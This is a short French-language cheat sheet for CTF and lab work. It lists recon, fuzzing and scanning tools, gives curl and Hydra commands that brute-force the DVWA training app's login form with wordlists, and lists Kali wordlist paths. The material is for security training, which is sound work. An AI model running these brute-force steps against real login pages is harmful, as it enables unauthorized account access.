# CTF
Write-up des chall que j'ai réalisé


# TOOLS
phoneinfoga => FrameWork pour OSINT de numero de telephone
Feroxbuster, dirb, dirbuster, gobuster => fuzz

nikto, Nessus, Rapid7, OpenVas => Scanner de vulnerabilitö web

BurpSuite, ZAProxy => Scanner de platforme web

Maltego => Reconnaissance passive graphique
Metagoofil => Reconnaissance passive

yersinia => Pour les protocoles de communication (Cisco et autre)

# BRUTE FORCE
Avec Hydra :
```
CSRF=$(curl -s -c dvwa.cookie "192.168.1.44/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
```
```
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')```
```
```
curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "192.168.1.44/DVWA/login.php"
```
```
hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/rockyou-40.txt \
  -e ns  -F  -u  -t 1  -w 10  -v  -V  192.168.1.44  http-get-form \
  "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
```

# WORDLIST :
/usr/share/wordlists
  |--dirb
  |--dirbuster
  |--fasttrack.txt
  |--fern-wifi
  |--metasploit
  |--nmap.lst
  |--rockyou.txt
  |--wfuzz

/usr/share/wordlists/dirb/common.txt => sub domain 
/usr/share/wordlists/dirb/big.txt => sub domain 
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
/usr/share/seclist/bitquark-subdomains-top100000.txt
/usr/share/seclist/subdomains-top1millions-110000.txt
